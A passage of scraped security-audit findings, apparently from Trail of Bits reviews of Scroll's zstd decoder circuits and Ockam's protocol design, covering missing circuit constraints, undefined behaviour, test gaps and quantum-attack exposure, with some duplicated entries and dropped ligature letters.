q_enable // is final ] .into_iter() .zip_eq(keccak_table.table_exprs(meta)) .map(|(value, table)| (cond.expr() * value, table)) .collect() }, ); Figure 6.1: Lookups from the chunk_data section of the table to the challenge section of the table ( zkevm-circuits/aggregator/src/aggregation/batch_data.rs#334362 ) All of these properties appear to hold; however, they are neither explicitly stated nor explicitly justied in Scrolls documentation. If any of them fails, it would allow a malicious prover to nalize a dierent batch of transactions than was committed, causing many potential issues such as denial of service or state divergence. Recommendations Short term, document this commitment scheme and specify what properties of dierent components it relies upon (e.g., deterministic decompression). Long term, explicitly document all intended security properties of the Scroll rollup, and what is required of each system component to ensure those properties.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "7. Left shift leads to undened behavior ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-scroll-zstd-compression-securityreview.pdf", "body": "The read_variable_bit_packing function accepts both an oset parameter and a maximum value, r , indicating the maximum value to be returned. The r parameter is specied as a u64. The number of bits required to store the decoded value is computed using a left shift with a variable shift size (see gure 7.1) from the function bit_length . // number of bits required to fit a value in the range 0..=r. let size = bit_length(r) as u32; let max = 1 << size; Figure 7.1: Calculating bit storage requirements from the range value r ( zkevm-circuits/aggregator/src/aggregation/decoder/witgen/util.rs#2324 ) If the top bit of r is set, the bit_length function will return 64. This shift is equal to the bit length of the max variable, leading to undened behavior . When compiled in debug mode, this should lead to a panic, but in release mode, the behavior is unspecied and can vary from platform to platform. On x86-64 processors, shift lengths are bit masked against 0x3f , meaning that 64 will reduce to zero, so max will be equal to 1. Other platforms may shift the one o the end, causing max to be 0. Additionally, on a platform where 1 == 1 << 64 , using the value u64::MAX for r will result in the check for non-variable bit packing to fail, leading to potential decoding errors. Recommendations Short term, add checks to specically handle the case where r is 64 bits long, whether through expanded handling or by explicitly rejecting values of r that can trigger this behavior. Long term, develop tests that integrate edge cases and validate correct handling. If r is restricted to values that will not trigger this edge case, ensure that this is clearly and conspicuously documented.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "8. Missing constraints for Block_Maximum_Size ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-scroll-zstd-compression-securityreview.pdf", "body": "The zstd specication document states that the Block_Size value should be bounded by Block_Maximum_Size , which is the smallest of Window_Size , or 128 KB. In Scroll's zstd encoded blobs, the Single_Segment_flag is set, so Window_Size should equal Frame_Content_Size according to the specication. Figure 8.1: Zstd specication dening how the Block_Size should be validated However, the constraints named DecoderConfig: tag BlockHeader (Block_Size) do not check that the Block_Size value is limited by the smallest value between Frame_Content_Size and 128KB. // block_size == block_header >> 3 // // i.e. block_header - (block_size * (2^3)) < 8 let block_header_lc = meta.query_advice(config.byte, Rotation( 2 )) * 65536. expr() + meta.query_advice(config.byte, Rotation( 1 )) * 256. expr() + meta.query_advice(config.byte, Rotation( 0 )); let block_size = meta.query_advice(config.block_config.block_len, Rotation::cur()); let diff = block_header_lc - (block_size * 8. expr()); vec! [(condition * diff, config.range8.into())] }); Figure 8.1: aggregator/src/aggregation/decoder.rs#L1833L1843 Exploit Scenario A malicious prover generates a proof for a zstd blob that does not follow the specication. Due to the missing constraint, the verier still accepts the proof as valid. Recommendations Short term, add the necessary constraint that ensures the correct validation of the BlockSize value. Long term, add positive and negative tests that parse and validate the BlockHeader according to the specication.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "9. Apparent discrepancy between bitwise-op-table conguration and code comment ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-scroll-zstd-compression-securityreview.pdf", "body": "The implementation and conguration of the bitwise_op_table are misleading, as the tables generic parameter does not match the code comment. The BitwiseOpTable structure uses generic arguments to congure which operation it implements. /// Bitwise operation table ( AND only) bitwise_op_table: BitwiseOpTable < 1 , L, R>, Figure 9.1: aggregator/src/aggregation/decoder.rs#L88L89 However, the code comment states that the table should be for the bitwise-and operation, but the generic parameter of 1 corresponds to the bitwise-or operation in the BitwiseOp structure: #[derive(Clone, Copy, Debug)] /// Bitwise operation types. pub enum BitwiseOp { /// AND AND = 0 , /// OR OR, /// XOR XOR, } impl_expr!(BitwiseOp); /// Lookup table for bitwise AND/OR/XOR operations. #[derive(Clone, Copy, Debug)] pub struct BitwiseOpTable < const OP_CHOICE: usize , const RANGE_L: usize , const RANGE_R: usize > { /// Denotes op: AND == 0, OR == 1, XOR == 2. pub op: Column <Fixed>, /// Denotes the left operand. pub lhs: Column <Fixed>, /// Denotes the right operand. pub rhs: Column <Fixed>, /// Denotes the bitwise operation on lhs and rhs. pub output: Column <Fixed>, Figure 9.2: zkevm-circuits/src/table.rs#L3270L3294 Despite this, the actual implementation is correct as an OP_CHOICE of 1 corresponds to the BitwiseOp::AND variant: /// Assign values to the BitwiseOp table. pub fn load <F: Field >(& self , layouter: & mut impl Layouter<F>) -> Result <(), Error> { layouter.assign_region( || \"BitwiseOp table\" , | mut region| { let mut offset = 0 ; let chosen_ops = match OP_CHOICE { 1 => vec! [BitwiseOp::AND] , 2 => vec! [BitwiseOp::OR], 3 => vec! [BitwiseOp::XOR], Figure 9.3: zkevm-circuits/src/table.rs#L3310L3319 Recommendations Short term, unify the representations and use enum variants in the generic arguments to clarify the implementation.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "10. The compression mode reserved eld is not enforced to equal zero ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-scroll-zstd-compression-securityreview.pdf", "body": "The symbol compression mode specication states that the rst two bits, corresponding to the Reserved eld, \"must be all-zeroes.\" However, the implementation does not constrain these witness values to be zero. Figure 10.1: Zstd specication stating that the Reserved eld should be zero Figure 10.2 shows how the bits at positions 7 to 2 are constrained, but no constraints exist for the bits at positions 1 and 0. let comp_mode_bit0_ll = select::expr( byte0_lt_0x80.expr(), meta.query_advice(bits[ 6 ], Rotation( 1 )), select::expr( byte0_lt_0xff.expr(), meta.query_advice(bits[ 6 ], Rotation( 2 )), meta.query_advice(bits[ 6 ], Rotation( 3 )), ), ); let comp_mode_bit1_ll = select::expr( byte0_lt_0x80.expr(), meta.query_advice(bits[ 7 ], Rotation( 1 )), select::expr( byte0_lt_0xff.expr(), meta.query_advice(bits[ 7 ], Rotation( 2 )), meta.query_advice(bits[ 7 ], Rotation( 3 )), ), ); let comp_mode_bit0_om = select::expr( byte0_lt_0x80.expr(), meta.query_advice(bits[ 4 ], Rotation( 1 )), select::expr( byte0_lt_0xff.expr(), meta.query_advice(bits[ 4 ], Rotation( 2 )), meta.query_advice(bits[ 4 ], Rotation( 3 )), ), ); let comp_mode_bit1_om = select::expr( byte0_lt_0x80.expr(), meta.query_advice(bits[ 5 ], Rotation( 1 )), select::expr( byte0_lt_0xff.expr(), meta.query_advice(bits[ 5 ], Rotation( 2 )), meta.query_advice(bits[ 5 ], Rotation( 3 )), ), ); let comp_mode_bit0_ml = select::expr( byte0_lt_0x80.expr(), meta.query_advice(bits[ 2 ], Rotation( 1 )), select::expr( byte0_lt_0xff.expr(), meta.query_advice(bits[ 2 ], Rotation( 2 )), meta.query_advice(bits[ 2 ], Rotation( 3 )), ), ); let comp_mode_bit1_ml = select::expr( byte0_lt_0x80.expr(), meta.query_advice(bits[ 3 ], Rotation( 1 )), select::expr( byte0_lt_0xff.expr(), meta.query_advice(bits[ 3 ], Rotation( 2 )), meta.query_advice(bits[ 3 ], Rotation( 3 )), ), Figure 10.2: aggregator/src/aggregation/decoder.rs#L378L433 Exploit Scenario A malicious prover generates a proof for a zstd blob that does not follow the specication. Due to the missing constraint, the verier still accepts the proof as valid. Recommendations Short term, add the necessary require_zero constraints to ensure that decoding is compliant with the specication. Long term, add positive and negative tests for all edge cases in the specication.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "11. The tag_cong.is_change witness is partially unconstrained ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-scroll-zstd-compression-securityreview.pdf", "body": "The constraints for the tag_config.is_change witness are not immediately obvious, making it dicult for the reader to know if it is correctly constrained. The tag_config.is_change witness is constrained to be true whenever byte_idx_delta && tag_idx_eq_tag_len_prev holds. However, this implies only that these two conditions are sucient for is_change to be true, where if the conditions are met, then is_change == true . cb.condition(and::expr([byte_idx_delta, tag_idx_eq_tag_len_prev]), |cb| { cb.require_equal( \"is_change is set\" , meta.query_advice(config.tag_config.is_change, Rotation::cur()), 1. expr(), ); }); Figure 11.1: aggregator/src/aggregation/decoder.rs#L1322L1328 The constraint for the necessary part is constrained only later, where is_change == true implies the two conditions. meta.create_gate( \"DecoderConfig: new tag\" , |meta| { let condition = and::expr([ meta.query_fixed(config.q_enable, Rotation::cur()), meta.query_advice(config.tag_config.is_change, Rotation::cur()), ]); let mut cb = BaseConstraintBuilder::default(); // The previous tag was processed completely. cb.require_equal( \"tag_idx::prev == tag_len::prev\" , meta.query_advice(config.tag_config.tag_idx, Rotation::prev()), meta.query_advice(config.tag_config.tag_len, Rotation::prev()), ); // Tag change also implies that the byte_idx transition did happen. cb.require_equal( \"byte_idx::prev + 1 == byte_idx::cur\" , meta.query_advice(config.byte_idx, Rotation::prev()) + 1. expr(), meta.query_advice(config.byte_idx, Rotation::cur()), ); Figure 11.2: aggregator/src/aggregation/decoder.rs#L1358L1378 Exploit Scenario A malicious prover can control the is_change witness when its value should be zero. By setting it to one when it should be zero, a malicious prover could bypass constraints related to ZstdBlockSequenceFseCode because they are constrained by not(tag_config.is_change) : meta.create_gate( \"DecoderConfig: tag ZstdBlockSequenceFseCode (other rows)\" , |meta| { let condition = and::expr([ meta.query_fixed(q_enable, Rotation::cur()), meta.query_advice(config.tag_config.is_fse_code, Rotation::cur()), not::expr(meta.query_advice(config.tag_config.is_change, Rotation::cur())) , not::expr( meta.query_advice(config.fse_decoder.is_trailing_bits, Rotation::cur()), ), ]); Figure 11.3: aggregator/src/aggregation/decoder.rs#22302240 A malicious prover could also bypass lookups into the VariableBitPacking table: meta.lookup_any( \"DecoderConfig: tag ZstdBlockSequenceFseCode (variable bit-packing)\" , |meta| { // At every row where a non-nil bitstring is read: // - except the AL bits (is_change=true) // - except when we are in repeat-bits loop // - except the trailing bits (if they exist) let condition = and::expr([ meta.query_fixed(config.q_enable, Rotation::cur()), meta.query_advice(config.tag_config.is_fse_code, Rotation::cur()), config.bitstream_decoder.is_not_nil(meta, Rotation::cur()), not::expr(meta.query_advice(config.tag_config.is_change, Rotation::cur())), not::expr( meta.query_advice(config.fse_decoder.is_repeat_bits_loop, Rotation::cur()), ), not::expr( meta.query_advice(config.fse_decoder.is_trailing_bits, Rotation::cur()), ), ]); [...] let range = table_size - probability_acc + 1. expr(); [ FixedLookupTag::VariableBitPacking.expr(), range, value_read, value_decoded, num_bits, 0. expr(), 0. expr(), ] .into_iter() .zip_eq(config.fixed_table.table_exprs(meta)) .map(|(arg, table)| (condition.expr() * arg, table)) .collect() }, ); Figure 11.4: aggregator/src/aggregation/decoder.rs#25522597 There are several other variables whose constraint soundness depends on the soundness of tag_config.is_change , meaning an accidental change in these two necessary and sucient conditions may undermine the security of many circuit components. Recommendations Short term, document where the necessary and sucient checks are performed, and therefore, constraints for is_change == false are not needed. 12. The is_llt/is_mot/is_mlt constraints are only valid if self.table_kind is in {1, 2, 3} Severity: High Diculty: High Type: Data Validation Finding ID: TOB-SCROLLZSTD-12 Target: aggregator/src/aggregation/decoder.rs", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "13. Values larger than 23 satisfy the \"spans_three_bytes\" constraints ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-scroll-zstd-compression-securityreview.pdf", "body": "The spans_three_bytes function should constrain the bit_index_end witness to lie in the [16, 23] interval. However, it accepts a value as long as bit_index_end > 15 . In particular, values larger than 23 will satisfy the constraint. /// A bitstring spans 3 bytes if the bit_index at which it ends is such that: /// - 16 <= bit_index_end <= 23. fn spans_three_bytes (& self , meta: & mut VirtualCells<Fr>, at: Rotation ) -> Expression <Fr> { let lhs = meta.query_advice( self .bit_index_end, at); let (lt2, eq2) = self .bit_index_end_cmp_15.expr_at(meta, at, lhs, 15. expr()); not::expr(lt2 + eq2) } Figure 13.1: aggregator/src/aggregation/decoder.rs#L637L643 In practice, this issue is unexploitablethus the informational severitybecause the current BitstringTable implementation does not support bitstrings spanning more than three bytes. However, we still highly recommend correctly constraining the bit_index_end witness: if the bitstream decoder starts supporting more than three bytes in the future, the missing constraint would cause soundness issues. Recommendations Short term, add a constraint enforcing that the bit_index_end witness is smaller than 24.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "4. RomTagTransition table does not allow ZstdBlockSequenceHeader -> BlockHeader transitions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-scroll-zstd-compression-securityreview.pdf", "body": "The RomTagTransition table does not allow transitioning from ZstdBlockSequenceHeader to BlockHeader . This causes a completeness issue where honestly generated compressed data does not satisfy the tag transition circuit. Figure 4.1 shows the allowed transitions and highlights the transitions that reach BlockHeader  none originate from ZstdBlockSequenceHeader : [ ] (FrameHeaderDescriptor, FrameContentSize), (FrameContentSize, BlockHeader ), (BlockHeader, ZstdBlockLiteralsHeader), (ZstdBlockLiteralsHeader, ZstdBlockLiteralsRawBytes), (ZstdBlockLiteralsRawBytes, ZstdBlockSequenceHeader), (ZstdBlockSequenceHeader, ZstdBlockSequenceFseCode), (ZstdBlockSequenceHeader, ZstdBlockSequenceData), (ZstdBlockSequenceFseCode, ZstdBlockSequenceFseCode), (ZstdBlockSequenceFseCode, ZstdBlockSequenceData), (ZstdBlockSequenceData, BlockHeader ), // multi-block (ZstdBlockSequenceData, Null), (Null, Null), Figure 4.1: aggregator/src/aggregation/decoder/tables/fixed/tag_transition.rs#L28L4 1 However, in the specication, the ZstdBlockSequenceHeader to BlockHeader transition is described and has associated constraints: Figure 4.2: Circuit specication where a ZstdBlockSequenceHeader to BlockHeader transition is mentioned Figure 4.3 shows the implementation of the constraint from gure 4.2: cb.condition(is_prev_sequence_header(meta), |cb| { cb.require_equal( \"tag::prev=SeqHeader\" , config .block_config .is_empty_sequences(meta, Rotation::prev()), 1. expr(), ); }); Figure 4.3: aggregator/src/aggregation/decoder.rs#18071815 Exploit Scenario A two-block encoded data, where the rst block contains no sequences to decode, is honestly generated by the zstd compression algorithm. However, due to the missing transition, this compressed data does not satisfy the decoder circuit. Recommendations Short term, allow for the ZstdBlockSequenceHeader to BlockHeader transition to occur in the tag transition circuit, or document why this is not allowed. Long term, add tests with zstd compressed data that exercise all possible valid tag transitions. 5. The back referencing phase is not properly constrained to a monotone behavior once activated Severity: Undetermined Diculty: Low Type: Cryptography Finding ID: TOB-SCROLLZSTD-5 Target: aggregator/src/aggregation/decoder/seq_exec.rs", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Undetermined"]}, {"title": "5. The back referencing phase is not properly constrained to a monotone behavior once activated ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-scroll-zstd-compression-securityreview.pdf", "body": "The column s_back_ref_phase is not properly constrained to ensure the back-referencing phase is monotone once activated. The issue is likely due to a typo. Executing decoding sequences happens in phases: Literal copy and back-references. The two phases must not occur simultaneously. Furthermore, each phase must have a monotone behaviori.e., the literal copy phase (the back-referencing phase, respectively) remains deactivated (activated, respectively). The constraint in gure 6.1 is meant to ensure the monotonicity of the back referencing phase once activated. However, likely due to a typo, s_back_ref_phase_prev is constrained to be equal to 1 instead of s_back_ref_phase . cb.condition( and::expr([ not::expr(is_inst_begin.expr()), s_back_ref_phase_prev.expr(), ]), |cb| { cb.require_equal( \"inside a inst, backref phase keep 1 once it changed to 1\" , s_back_ref_phase_prev.expr(), 1. expr(), ); }, ); Figure 5.1: aggregator/src/aggregation/decoder/seq_exec.rs#L393L405 However, other constraints enforce that either a phase is activated or the current rows correspond to padding. But exploiting this issue appears dicult due to adjacent constraints. The monotonicity of the literal copy phase once deactivated is guaranteed by appropriate constraints. Therefore, to use arbitrary values in the column s_back_ref_phase , a malicious prover must produce a copy command that is compatible with the copied value. On the other hand, when no phase is activated, the current rows correspond to padding rows. An attacker could potentially abuse the ineective constraints to provide a shorter witness. It is unclear whether this approach is feasible and what impact such an attack may ultimately have on the overall system. Exploit Scenario An attacker notices the defective constraints and produces a false witness by exploiting the missing constraints for monotonicity on s_back_ref_phase . We could not fully determine the feasibility of producing malicious witnesses or whether monotonicity is fully guaranteed by adjacent constraints. Recommendations Short term, amend the code so that it constrains s_back_ref_phase to be equal to 1 instead of s_back_ref_phase_prev . cb.condition( and::expr([ not::expr(is_inst_begin.expr()), s_back_ref_phase_prev.expr(), ]), |cb| { cb.require_equal( \"inside a inst, backref phase keep 1 once it changed to 1\" , s_back_ref_phase.expr(), 1. expr(), ); }, ); Figure 5.2: An example x of the aforementioned issue Long term, review the codebase for potential variable typos and patterns that could render constraints void. Some examples of patterns to investigate include: comparing a variable with itself, subtracting a variable from itself, or naming conventions such as: (variable_name, variable_name_prev) . 6. The blob-based public input commitment scheme is poorly documented Severity: Informational Diculty: N/A Type: Cryptography Finding ID: TOB-SCROLLZSTD-6 Target: aggregator/", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Low"]}, {"title": "6. The blob-based public input commitment scheme is poorly documented ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-scroll-zstd-compression-securityreview.pdf", "body": "To reduce the gas cost of verication, the Scroll team has moved some of the ZkEVMs public input data into the EIP-4844 blob structure, whereby the underlying data is stored only temporarily, at a lower gas cost. The verier contract has access only to a polynomial commitment to the blob data and evaluation proofs. Additionally, with the addition of the zstd circuits reviewed in this report, the data in the blob is instead in zstd-compressed form. When the ZkEVM verier is deployed in the Scroll rollup contract, a batch, consisting of both L1 and L2 transactions and associated metadata, is committed in the rollup contract. Committed batches can then either be reverted or nalized. To nalize a batch, a ZkEVM proof is checked against the metadata provided in the commit stage, and if the proof succeeds, the batch is nalized and can no longer be reverted. Since the ZkEVM prover should be untrusted in the system, the metadata in the commit stage must uniquely identify the transactions in the underlying batch; otherwise, the prover may be able to nalize a dierent sequence of transactions than was intended. Prior to EIP-4844 integration, the sequence of transactions in a chunk was fully determined by the public input hash of the ZkEVM circuit, which would then be combined together into an overall public input hash by the aggregation circuit. In this scheme, the unique identication is a straightforward consequence of the collision resistance of the hash used. However, the current scheme is more complex. The transactions are now split between this public input hash and the blob structure. The PI subcircuit of the ZkEVM splits the underlying sequence of transactions into L1 and L2 transactions. The L1 transactions are included in the public input hash, and the L2 transactions are included in the chunk tx hash. Unless there is some as-yet-unknown aw in the PI subcircuit, this guarantees the uniqueness of the L1 transactions as before. To commit to the L2 transactions, the overall public inputs of the aggregation circuit include a tuple (versionedHash,z,y) , representing the polynomial commitment to the blob and the evaluation that must be checked by the verier. To conclude that this uniquely identies a particular sequence of L2 transactions, we must determine that: is a unique polynomial corresponding to versionedHash ; is a unique polynomial corresponding to the L2 transaction 1. 2. 3.  (  )  (  ) , where , where  (  ) =   (  ) =  sequence;  both the L2 transaction sequence and versionedHash . is a pseudorandom challenge derived from a transcript including commitments to These three requirements suce because blobs represent degree-4096 polynomials over a 254-bit nite eld. The chance that point purpose of checking that for a randomly sampled as randomly sampled for the is negligible, and requirement (3) allows us to treat by the Fiat-Shamir heuristic.  (  )   (  )  (  ) =  (  )  (  ) =  (  ) and   Requirement (1) is ensured because the verier contract checks a point evaluation proof, and versionedHash is a hash of a KZG commitment, which uniquely determines  (  ) .  (  ) is more complicated, since the underlying The evaluation in requirement (2) is checked by the BarycentricEvaluationConfig circuit. However, the uniqueness of transaction data is not stored in the blob. Instead, the BatchDataConfig subcircuit of the aggregation circuit includes the whole L2 transaction sequence data as private witness values. The aggregation circuit checks those hashes against the chunk tx hash public inputs of the ZkEVM proofs being aggregated, and checks that the L2 transaction sequence is the result of zstd-decompressing the data used in the BarycentricEvaluationConfig circuit. To then establish that circuit is deterministic; and (b) that the serialization of the L2 transactions when computing the chunk tx hash is unique. is unique, we must assume (a) that the zstd decompression  (  ) Finally, requirement (3) is ensured by checking that the challenge can be computed as a hash of data that includes the versionedHash and the chunk tx hashes, via an internal lookup in the BatchDataConfig table, shown below in gure 6.1. // lookup challenge digest in keccak table. meta.lookup_any( \"BatchDataConfig (metadata/chunk_data/challenge digests in keccak table)\" , |meta| { let is_hash = meta.query_selector(config.hash_selector); let is_boundary = meta.query_advice(config.is_boundary, Rotation::cur()); // when is_boundary is set in the \"digest RLC\" section. // this is also the last row of the \"digest RLC\" section. let cond = is_hash * is_boundary; // - metadata_digest: 32 bytes // - chunk[i].chunk_data_digest: 32 bytes each // - versioned_hash: 32 bytes let preimage_len = 32. expr() * (N_SNARKS + 1 + 1 ).expr(); [ 1. expr(), 1. expr(), meta.query_advice(config.preimage_rlc, Rotation::cur()), // input rlc // input len preimage_len, // output rlc meta.query_advice(config.digest_rlc, Rotation::cur()), // q_enable // is final ] .into_iter() .zip_eq(keccak_table.table_exprs(meta)) .map(|(value, table)| (cond.expr() * value, table)) .collect() }, ); Figure 6.1: Lookups from the chunk_data section of the table to the challenge section of the table ( zkevm-circuits/aggregator/src/aggregation/batch_data.rs#334362 ) All of these properties appear to hold; however, they are neither explicitly stated nor explicitly justied in Scrolls documentation. If any of them fails, it would allow a malicious prover to nalize a dierent batch of transactions than was committed, causing many potential issues such as denial of service or state divergence. Recommendations Short term, document this commitment scheme and specify what properties of dierent components it relies upon (e.g., deterministic decompression). Long term, explicitly document all intended security properties of the Scroll rollup, and what is required of each system component to ensure those properties. 7. Left shift leads to undened behavior Severity: Low Diculty: Low Type: Undened Behavior Finding ID: TOB-SCROLLZSTD-7 Target: aggregator/src/aggregation/decoder/witgen/util.rs", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "12. The is_llt/is_mot/is_mlt constraints are only valid if self.table_kind is in {1, 2, 3} ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-scroll-zstd-compression-securityreview.pdf", "body": "The implementation of the is_llt , is_mot and is_mlt functions relies on the table_kind witness being in the set {1, 2, 3} . It is not immediately clear from the implementation that the table_kind variable is constrained to that set. Upon reporting this nding, the Scroll team identied that the table_kind witness is unconstrained on a trailing bits row. Without this constraint, a malicious prover can set an incorrect table_kind and then set the next table_kind value incorrectly (by essentially skipping one step). impl FseDecoder { fn is_llt (& self , meta: & mut VirtualCells<Fr>, rotation: Rotation ) -> Expression <Fr> { let table_kind = meta.query_advice( self .table_kind, rotation); let invert_of_2 = Fr::from( 2 ).invert().expect( \"infallible\" ); (FseTableKind::MLT.expr() - table_kind.expr()) * (FseTableKind::MOT.expr() - table_kind.expr()) * invert_of_2 } fn is_mot (& self , meta: & mut VirtualCells<Fr>, rotation: Rotation ) -> Expression <Fr> { let table_kind = meta.query_advice( self .table_kind, rotation); (table_kind.expr() - FseTableKind::LLT.expr()) * (FseTableKind::MLT.expr() - table_kind.expr()) } fn is_mlt (& self , meta: & mut VirtualCells<Fr>, rotation: Rotation ) -> Expression <Fr> { let table_kind = meta.query_advice( self .table_kind, rotation); let invert_of_2 = Fr::from( 2 ).invert().expect( \"infallible\" ); (table_kind.expr() - FseTableKind::LLT.expr()) * (table_kind.expr() - FseTableKind::MOT.expr()) * invert_of_2 } Figure 12.1: aggregator/src/aggregation/decoder.rs#L747L768 There are lookups into tables that correctly constrain table_kind , such as the lookup into the PredefinedFse table: // For predefined FSE tables, we must validate against the ROM predefined table fields for // every state in the FSE table. meta.lookup_any( \"FseTable: predefined table validation\" , |meta| { let condition = and::expr([ meta.query_fixed(q_enable, Rotation::cur()), meta.query_advice(config.sorted_table.is_predefined, Rotation::cur()), not::expr(meta.query_advice(config.is_skipped_state, Rotation::cur())), not::expr(meta.query_advice(config.is_padding, Rotation::cur())), ]); let (table_kind, table_size, state, symbol, baseline, nb) = ( meta.query_advice(config.sorted_table.table_kind, Rotation::cur()), meta.query_advice(config.sorted_table.table_size, Rotation::cur()), meta.query_advice(config.state, Rotation::cur()), meta.query_advice(config.symbol, Rotation::cur()), meta.query_advice(config.baseline, Rotation::cur()), meta.query_advice(config.nb, Rotation::cur()), ); [ FixedLookupTag::PredefinedFse.expr(), table_kind, table_size, state, symbol, baseline, nb, ] .into_iter() .zip_eq(fixed_table.table_exprs(meta)) .map(|(arg, table)| (condition.expr() * arg, table)) .collect() }); Figure 12.2: aggregator/src/aggregation/decoder/tables/fse.rs#L590L622 However, the set of conditions under which these lookups occur diers from other sets of conditions where the is_llt , is_mot and is_mlt functions are used (either explicitly or implicitly), which could lead to soundness issues. Recommendations Short term, add explicit constraints to the table_kind witness, and ensure that the witness is constrained in every case. Long term, add negative tests to ensure that incorrect or unexpected values of table_kind do not satisfy the constraints of the decoder circuit.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "14. Missing a large number of test cases that should fail ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-scroll-zstd-compression-securityreview.pdf", "body": "Overall, we found that there is a severe lack of testing, with a total of only 17 tests that do not comprehensively test the functionality of the decoder circuit. Not only should tests cover the expected success cases, but they should also ensure that well-dened failure modes are not possible within the connes of the system. We have compiled a non-exhaustive list of such test cases below:       Boolean witnesses should not satisfy the witness generator if they are assigned non-Boolean values. This type of test is most valuable before implementing the custom wrapper type described in TOB-SCROLLZSTD-1 , but tests similar in nature are still recommended for similarly constrained values. Add tests for all valid RomTagTransition pairs, ensuring compatibility with the zstd specication ( TOB-SCROLLZSTD-4 ). Add tests for various BlockHeader congurations, ensuring congurations that fall outside the specication are rejected ( TOB-SCROLLZSTD-8 ). Add tests for the reserved compression mode bits ( TOB-SCROLLZSTD-10 ). Add tests that try to insert an invalid table_kind value ( TOB-SCROLLZSTD-12 ). Add randomized round trip encoder tests. There is currently a single test that checks the satisability of the encoding of a known string. However, this test is also for a singular string and is not easily generalized to other input sizes. Randomized round trip testing can better guarantee the correctness of the encoding and decoding steps by easily generating larger inputs. We also recommend the addition of fuzz testing. In large systems like these, it is hard to systematically test every edge case of the system. Fuzz testing enables the user to automate the randomization of inputs, leading to potentially higher constraint coverage. Recommendations Short term, add additional unit tests for the failure modes listed in the above issues. Long term, add support for fuzzing of the witness generator, where a valid witness can have some cells perturbed. If any of these small perturbations leads to another valid witness assignment, there is a high likelihood of a missing constraint somewhere. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: N/A"]}, {"title": "1. The system is vulnerable to SNDL attacks by quantum computers ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-ockam-designreview.pdf", "body": "The Ockam system uses the Noise XX handshake pattern with ECDH based on X25519, which could be broken using a large-scale quantum computer. Currently, no quantum computer capable of doing this exists. Although Ockam could be quickly updated to resist quantum attacks, current handshakes would still be vulnerable to \"store now, decrypt later\" (SNDL) attacks using a quantum computer, as described in the exploit scenario below. The design should address whether this is considered as part of the threat model. Exploit Scenario An attacker captures and stores the full transcript of a handshake and the subsequent encrypted communications. Once a large-scale quantum computer becomes available, the attacker recovers all ECDH private keys using the quantum computer. They use this to obtain the derived keys from the transcript and decrypt the communications. Recommendations Short term, document whether SNDL attacks using a quantum computer are applicable to the threat model for dierent use cases so that users can consider this in the context of their own risk management. If the attacks are applicable, investigate the feasibility of incorporating post-quantum secure alternatives into the system. Because the goal is to prevent SNDL attacks, it is not necessary to upgrade all cryptographic primitives to be secure against a quantum computer. However, at least one of the contributions to the key derivation must come from a PQC KEM (e.g., Signals PQXDH). As described in the PQNoise paper, it is straightforward to update the Noise ee pattern using a PQC KEM to achieve the same round complexity. Instead of replacing the classical DH, we propose adding a PQC KEM to achieve a hybrid solution (e.g., the IETF draft on hybrid key exchange in TLS). Long term, if attacks using a quantum computer are part of the threat model for Ockam use cases, migrate both the key exchanges and digital signatures to a hybrid solution 16 Ockam Design Review incorporating both classical and post-quantum resistant primitives (e.g., using PQNoise with suitable hybrid KEMs). 17 Ockam Design Review", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "2. Serialized VersionedData structs data is ambiguous ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-ockam-designreview.pdf", "body": "Identity private keys are used to sign both Change blocks, which are used to rotate the identity keys, and PurposeKeyAttestation blocks, which are used to attest to purpose keys. Before being signed, the data inside these blocks is serialized using the Concise Binary Object Representation (CBOR) data format and included in a VersionedData struct. However, this serialization will not add dierent labels for these dierent data types by itself, which means that the data eld of a VersionedData instance does not indicate which type it contains (i.e., ChangeData or PurposeKeyAttestationData). Therefore, it is possible to provide a signed VersionedData instance containing a PurposeKeyAttestationData block where the receiver expects it to contain a ChangeData block. The receiver will potentially accept the signature as valid as long as it is created using the expected identity key. Whether this confusion can be exploited depends on implementation details that are not in scope for this design review. Specically, it depends on what happens when a PurposeKeyAttestationData type is deserialized as a ChangeData type. Currently, it seems likely that this will fail due to dierences in the structure of the types, but it is not possible to determine the full behavior from the design description alone. Even if the current implementation rejects a serialized PurposeKeyAttestationData instance as invalid when it attempts to deserialize the byte vector as a ChangeData structure, a future version of the protocol may accept it as valid if either of the two types change. Exploit Scenario A node creates and attests to various purpose keys to outsource the handling of the purpose to other instances, which do not have access to the identity key. An attacker compromises one of the instances and obtains the PurposeKeyAttestation block containing a signed VersionedData instance. The attacker communicates a new Change to another node, while providing the signed VersionedData from the PurposeKeyAttestation block. The previous_signature eld inside the Change block is set to the signature from the PurposeKeyAttestation block (i.e., the signature on the VersionedData instance containing the 18 Ockam Design Review PurposeKeyAttestationData). The other node will accept the previous_signature on the VersionedData because it is a signature under the same identity primary key. For this exploit to be useful, the data eld of the 